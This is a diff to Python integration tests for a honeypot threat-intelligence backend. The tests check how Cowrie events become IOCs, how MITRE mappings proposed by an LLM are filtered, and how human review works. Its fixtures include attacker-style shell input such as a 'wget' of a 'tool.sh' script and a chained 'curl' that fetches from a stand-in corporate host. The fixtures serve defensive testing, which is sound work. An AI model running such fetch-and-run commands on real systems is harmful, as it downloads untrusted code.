@@ -1,5 +1,6 @@
 """Transactional PostgreSQL checks for the combined Cowrie/intelligence flows."""
 from pathlib import Path
+from datetime import datetime, timedelta
 from tempfile import TemporaryDirectory
 from unittest.mock import patch
 from uuid import UUID, uuid4
@@ -22,7 +23,7 @@ class CollaborativeIntegrationTests(fixtures.AuthFixture):
     def event(self, **changes):
         return {'session':'merged-'+uuid4().hex, 'eventid':'cowrie.command.input',
                 'timestamp':self.clock.isoformat(), 'src_ip':'198.51.100.45',
-                'input':'wget https://evidence.example/tool.sh',
+                'input':'wget https://evidence.corp.local/tool.sh',
                 '_collector':{'source_id':'merged:'+uuid4().hex}, **changes}
 
     def ingest(self, events, expected=200):
@@ -79,23 +80,35 @@ class CollaborativeIntegrationTests(fixtures.AuthFixture):
         event_id = self.ingest([raw])['confirmaciones'][0]['id_evento']
         row = self.observable(event_id)
         self.assertEqual(self.client.get('/api/iocs').status_code,401)
+        detail = '/api/iocs/'+str(row['id_ioc'])+'/observaciones'
+        self.assertEqual(self.client.get(detail).status_code,401)
         self.enroll(92)
+        self.assertEqual(self.client.get(detail).status_code,200)
+        self.assertEqual(self.client.get('/api/iocs/'+str(uuid4())+'/observaciones').status_code,404)
         response = self.client.patch('/api/inteligencia/ioc/'+str(row['id_ioc'])+'/revision',
             json={'estado':'descartado','motivo':'Analista no puede decidir este estado'})
         self.assertEqual(response.status_code,403,response.text)
+        self.assertEqual(self.client.patch('/api/inteligencia/observacion_ioc/'+str(row['id_observacion'])+'/revision',
+            json={'estado':'confirmado','motivo':'Analista no puede confirmar relevancia'}).status_code,403)
         self.assertEqual(self.observable(event_id)['estado_revision'],'pendiente')
 
     def test_model_findings_and_review_remain_visible_with_supported_mitre_only(self):
         self.enroll(93,admin=True)
-        raw = self.event(input='printf bundles.zip')
+        url = 'https://evidence.corp.local/tool.sh?arg=1'
+        raw = self.event(input=f"printf bundles.zip; curl '{url}'")
         event_id = self.ingest([raw])['confirmaciones'][0]['id_evento']
         e = app.state.tables['evento']
         sid = self.connection.scalar(select(e.c.id_sesion).where(e.c.id_evento==event_id))
         result = AnalysisResult(resumen='Comando literal observado, sin descarga confirmada',acciones=[
             Finding(tipo='comando',descripcion='Comando de shell registrado',confianza=0.8,eventos=[event_id],
-                iocs=[IocProposal(tipo='Dominio',valor='bundles.zip',evento=event_id)],
+                iocs=[IocProposal(tipo='Dominio',valor='bundles.zip',evento=event_id),
+                      IocProposal(tipo='URL',valor=url.split('?')[0],evento=event_id),
+                      IocProposal(tipo='URL',valor=url,evento=event_id+1000),
+                      IocProposal(tipo='URL',referencia=2,evento=event_id)],
                 mitre=[MitreProposal(codigo='T1059.004',codigo_tactica='TA0002',justificacion='Comando escrito en la shell emulada, sin prueba de ejecucion en Ubuntu real',limitaciones=['La shell de Cowrie es emulada y requiere revision humana'],confianza=0.8),
-                       MitreProposal(codigo='T1078',justificacion='Propuesta no permitida en este laboratorio',confianza=0.5)])])
+                       MitreProposal(codigo='T1078',justificacion='Propuesta no permitida en este laboratorio',confianza=0.5)]),
+            Finding(tipo='otra acción',descripcion='Mismo evento asociado',confianza=0.7,eventos=[event_id],
+                iocs=[IocProposal(tipo='URL',valor=url,evento=event_id)])])
         with patch('backend.routes.real_result',return_value=result):
             analyzed = self.client.post('/api/sesiones/'+str(sid)+'/analizar')
         self.assertEqual(analyzed.status_code,200,analyzed.text)
@@ -103,8 +116,17 @@ class CollaborativeIntegrationTests(fixtures.AuthFixture):
         analysis = app.state.tables['analisis_llm']
         saved = self.connection.scalar(select(analysis.c.resultado_estructurado).where(analysis.c.id_analisis==aid))
         self.assertEqual(saved['mapeos_descartados'][0]['codigo'],'T1078')
+        self.assertEqual([rejected['motivo'] for rejected in saved['propuestas_ioc_descartadas']], [
+            'sin_evidencia_determinista','sin_evidencia_determinista','evento_ajeno_a_la_accion'])
+        self.assertEqual(saved['acciones'][0]['iocs'][0]['valor'],url)
         listed = self.client.get('/api/iocs').json()
-        self.assertTrue(any(row['valor']=='bundles.zip' for row in listed))
+        self.assertFalse(any(row['valor']=='bundles.zip' for row in listed))
+        ioc = next(row for row in listed if row['valor']==url)
+        observed, = self.client.get(f"/api/iocs/{ioc['id_ioc']}/observaciones").json()
+        self.assertEqual(observed['id_evento'],str(event_id))
+        self.assertEqual(observed['estado_revision'],'pendiente')
+        self.assertEqual(len(observed['acciones']),2)
+        self.assertTrue(all(link['vinculo_determinista'] for link in observed['acciones']))
         m = app.state.tables['mapeo_mitre']
         action = app.state.tables['accion_identificada']
         mid = self.connection.scalar(select(m.c.id_mapeo).join(action,m.c.id_accion==action.c.id_accion).where(action.c.id_analisis==aid))
@@ -112,10 +134,71 @@ class CollaborativeIntegrationTests(fixtures.AuthFixture):
             json={'estado':'confirmado','motivo':'Evidencia literal de shell revisada'})
         self.assertEqual(response.status_code,200,response.text)
         self.assertEqual(self.connection.scalar(select(m.c.estado_revision).where(m.c.id_mapeo==mid)),'confirmado')
-        # A historical model detection remains visible after the backfill and
-        # an existing human verdict is never overwritten by that operation.
         backfill_detections(self.connection,app.state.tables)
-        self.assertTrue(any(row['valor']=='bundles.zip' for row in self.client.get('/api/iocs').json()))
+        self.assertFalse(any(row['valor']=='bundles.zip' for row in self.client.get('/api/iocs').json()))
+
+    def test_same_normalized_url_preserves_sessions_outcomes_and_individual_review(self):
+        self.enroll(94,admin=True)
+        latest = self.clock + timedelta(seconds=2)
+        raw = self.event(eventid='cowrie.session.file_download', timestamp=latest.isoformat(),
+            url='HTTPS://Artifacts.Corp.Local/file?x=%2F&y=2', shasum='aBcD'*16,
+            src_ip='FD00:0::FA', password='private-fixture')
+        earlier = self.event(eventid='cowrie.session.file_download.failed',
+            url='https://artifacts.corp.local/file?x=%2F&y=2', src_ip='fd00::fa')
+        receipts = self.ingest([raw,earlier])['confirmaciones']
+        listed = self.client.get('/api/iocs').json()
+        row = next(x for x in listed if x['valor']==earlier['url'])
+        self.assertEqual((row['evidencias'],row['sesiones'],row['observaciones_verificables']),(2,2,2))
+        self.assertEqual(datetime.fromisoformat(row['primera_observacion']),self.clock)
+        self.assertEqual(datetime.fromisoformat(row['ultima_observacion']),latest)
+        ip = next(x for x in listed if x['valor']=='fd00::fa')
+        self.assertEqual((ip['evidencias'],ip['sesiones']),(2,2))
+        endpoint = f"/api/iocs/{row['id_ioc']}/observaciones"
+        first,second = [self.client.get(endpoint,params={'limit':1,'offset':offset}).json()[0] for offset in (0,1)]
+        self.assertEqual([item['id_evento'] for item in (first,second)],
+                         [str(receipt['id_evento']) for receipt in receipts])
+        self.assertNotEqual(first['id_sesion'],second['id_sesion'])
+        self.assertEqual((first['tipo'],first['valor_normalizado']),('URL',earlier['url']))
+        self.assertEqual(first['datos_originales']['password'],'[REDACTED]')
+        self.assertEqual(first['detalles'][0]['valor_original'],raw['url'])
+        self.assertEqual(first['detalles'][0]['comportamiento'],'descarga_registrada')
+        self.assertEqual(second['detalles'][0]['comportamiento'],'descarga_fallida')
+        event = app.state.tables['evento']
+        stored = self.connection.scalar(select(event.c.datos_originales).where(event.c.id_evento==receipts[0]['id_evento']))
+        self.assertEqual(stored,{k:v for k,v in raw.items() if k!='_collector'})
+        review = self.client.patch(f"/api/inteligencia/observacion_ioc/{first['id_observacion']}/revision",
+            json={'estado':'confirmado','motivo':'Resultado relevante para esta sesión'})
+        self.assertEqual(review.status_code,200,review.text)
+        self.assertEqual(self.client.get(endpoint).json()[1]['estado_revision'],'pendiente')
+        self.assertEqual(next(x for x in self.client.get('/api/iocs').json() if x['id_ioc']==row['id_ioc'])['estado_revision'],'mixto')
+
+    def test_legacy_detection_remains_visible_and_cannot_gain_a_new_confirmation(self):
+        self.enroll(95,admin=True)
+        t = app.state.tables
+        raw = self.event(input='printf bundles.zip')
+        event_id = self.ingest([raw])['confirmaciones'][0]['id_evento']
+        sid = self.connection.scalar(select(t['evento'].c.id_sesion).where(t['evento'].c.id_evento==event_id))
+        model_id = self.connection.scalar(select(t['modelo_llm'].c.id_modelo).limit(1))
+        aid = self.connection.scalar(t['analisis_llm'].insert().values(
+            id_sesion=sid,id_modelo=model_id,estado='en_proceso',fecha_inicio=self.clock)
+            .returning(t['analisis_llm'].c.id_analisis))
+        kind = self.connection.scalar(select(t['tipo_ioc'].c.id_tipo_ioc).where(t['tipo_ioc'].c.nombre=='Dominio'))
+        ioc = self.connection.scalar(t['ioc'].insert().values(
+            id_tipo_ioc=kind,valor='bundles.zip',primera_observacion=self.clock,ultima_observacion=self.clock)
+            .returning(t['ioc'].c.id_ioc))
+        self.connection.execute(t['deteccion_ioc'].insert().values(
+            id_ioc=ioc,id_evento=event_id,id_analisis=aid,evidencia='Propuesta histórica sin respaldo'))
+        backfill_detections(self.connection,t)
+        before, = self.client.get(f'/api/iocs/{ioc}/observaciones').json()
+        persist_observables(self.connection,t,raw,event_id,self.clock)
+        backfill_detections(self.connection,t)
+        self.assertEqual(self.client.get(f'/api/iocs/{ioc}/observaciones').json(),[before])
+        self.assertEqual(before['detalles'],[])
+        listing = next(row for row in self.client.get('/api/iocs').json() if row['id_ioc']==str(ioc))
+        self.assertEqual((listing['estado_revision'],listing['observaciones_historicas']),('historico',1))
+        response = self.client.patch(f"/api/inteligencia/observacion_ioc/{before['id_observacion']}/revision",
+            json={'estado':'confirmado','motivo':'Esta propuesta carece de evidencia'})
+        self.assertEqual(response.status_code,409,response.text)
 
     def test_seed_preserves_existing_metadata_and_catalog_supplies_allowed_codes(self):
         tech = app.state.tables['tecnica_mitre']
